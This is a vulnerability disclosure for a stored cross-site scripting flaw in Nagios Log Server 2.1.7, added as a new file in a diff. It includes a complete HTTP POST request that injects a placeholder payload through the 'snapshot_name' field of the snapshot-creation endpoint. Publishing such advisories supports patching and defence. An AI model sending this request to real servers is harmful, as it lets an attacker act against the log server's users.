@@ -1,0 +1,41 @@
+# Exploit Title: Nagios Log Server 2.1.7 - 'snapshot_name' Persistent Cross-Site Scripting
+# Date: 31.08.2020
+# Exploit Author: Emre ÖVÜNÇ
+# Vendor Homepage: https://www.nagios.com/
+# Software Link: https://www.nagios.com/products/nagios-log-server/
+# Version: 2.1.7
+# Tested on: Linux/ISO
+
+# Link:
+https://github.com/EmreOvunc/Nagios-Log-Server-2.1.7-Persistent-Cross-Site-Scripting
+
+# Description
+
+A stored cross-site scripting (XSS) in Nagios Log Server 2.1.7 can result
+in an attacker performing malicious actions to users who open a maliciously
+crafted link or third-party web page.
+
+# PoC
+
+To exploit vulnerability, someone could use a POST request to
+'/nagioslogserver/configure/create_snapshot' by manipulating
+'snapshot_name' parameter in the request body to impact users who open a
+maliciously crafted link or third-party web page.
+
+POST /nagioslogserver/configure/create_snapshot HTTP/1.1
+Host: [TARGET]
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:79.0)
+Gecko/20100101 Firefox/79.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: tr-TR,tr;q=0.8,en-US;q=0.5,en;q=0.3
+Accept-Encoding: gzip, deflate
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 117
+DNT: 1
+Connection: close
+Cookie: csrf_ls=b3bef5c1a2ef6e4c233282d1c1c229fd;
+ls_session=883lergotgcjbh9bjgaeakosv5go2gbb;
+PHPSESSID=nbah0vkmibpudd1qh7qgnpgo53
+Upgrade-Insecure-Requests: 1
+
+csrf_ls=b3bef5c1a2ef6e4c233282d1c1c229fd&snapshot_name=[XSS_PAYLOAD]
